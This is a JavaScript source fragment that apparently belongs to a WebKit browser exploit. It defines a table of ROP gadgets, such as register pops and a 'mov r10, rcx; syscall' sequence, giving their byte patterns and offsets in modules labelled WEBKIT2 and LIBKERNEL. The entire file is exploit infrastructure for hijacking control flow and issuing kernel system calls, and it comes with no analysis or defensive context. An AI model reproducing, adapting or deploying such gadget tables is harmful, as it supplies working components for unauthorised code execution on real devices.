var gadgets = {
    "pop rbp": new gadget([0x5d], WEBKIT2, 0xc9), //match
    "pop rax": new gadget([0x58], WEBKIT2, 0x3375D),//match
    "pop rcx": new gadget([0x59], WEBKIT2, 0x3D629),//match
    "pop rdx": new gadget([0x5a], WEBKIT2, 0x7C2),//match
    "pop rsi": new gadget([0x5e], WEBKIT2, 0x2A2D63),//check
    "pop rdi": new gadget([0x5f], WEBKIT2, 0xA6FDD),//check
    "pop r8": new gadget([0x41, 0x58], WEBKIT2, 0xB82CD),//match
    "pop r9": new gadget([0x43, 0x59], WEBKIT2, 0x1D913D4),//check
    "pop rsp": new gadget([0xf3, 0x5c], WEBKIT2, 0x5FB25),//match
    
    "mov r10, rcx; syscall": new gadget([0x49, 0x89, 0xca, 0x0f, 0x05], LIBKERNEL, 0x457), //match
        
    "mov [rax+0x60], rdi": new gadget([0x48, 0x89, 0x78, 0x60], WEBKIT2, 0x2B6304), //match

    "mov [rsi+0x18], rax": new gadget([0x48, 0x89, 0x46, 0x18], WEBKIT2, 0x46EC5), //match
}